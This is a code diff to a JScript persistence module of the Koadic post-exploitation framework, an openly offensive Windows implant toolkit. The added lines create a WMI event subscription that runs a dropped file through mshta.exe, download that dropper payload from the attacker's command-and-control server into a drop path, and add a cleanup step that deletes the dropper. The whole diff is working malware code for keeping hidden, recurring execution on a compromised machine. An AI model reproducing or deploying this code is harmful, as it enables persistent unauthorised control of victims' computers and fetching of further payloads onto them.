@@ -3,6 +3,7 @@ try
 
     var headers = {};
     var subname = "K0adic";
+    var droppath = Koadic.file.getPath("~FDROPDIR~\\~FDROPFILE~");
 
     if (~CLEANUP~)
     {
@@ -20,12 +21,12 @@ try
         }
         headers["Task"] = "RemovePersistence";
         Koadic.work.report("done", headers);
+        headers["Task"] = "DeleteDropper";
+        Koadic.file.deleteFile(droppath);
+        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
     }
     else
     {
-        var comspec = Koadic.shell.exec("echo %comspec%", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
-        comspec = comspec.split(" \r\n")[0];
-
         var wmi1 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
         var eventfilterclass = wmi1.Get("__EventFilter");
         var eventfilter = eventfilterclass.SpawnInstance_();
@@ -41,7 +42,7 @@ try
         var commandlineeventclass = wmi2.Get("CommandLineEventConsumer");
         var commandlineevent = commandlineeventclass.SpawnInstance_();
         commandlineevent.Name = subname;
-        commandlineevent.CommandLineTemplate = comspec+" /q /c ~CMD~";
+        commandlineevent.CommandLineTemplate = "C:\\Windows\\system32\\mshta.exe "+droppath;
         commandlineevent.RunInteractively = "false";
         res = commandlineevent.Put_();
         headers["Task"] = "CreateConsumer";
@@ -55,6 +56,12 @@ try
         res = filtertoconsumerbinding.Put_();
         headers["Task"] = "CreateBinding";
         Koadic.work.report(res.Path, headers);
+
+        headers["X-UploadFileJob"] = "true";
+        Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, droppath);
+        headers["X-UploadFileJob"] = "false";
+        headers["Task"] = "AddDropper";
+        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
     }
     Koadic.work.report("Complete");
 }
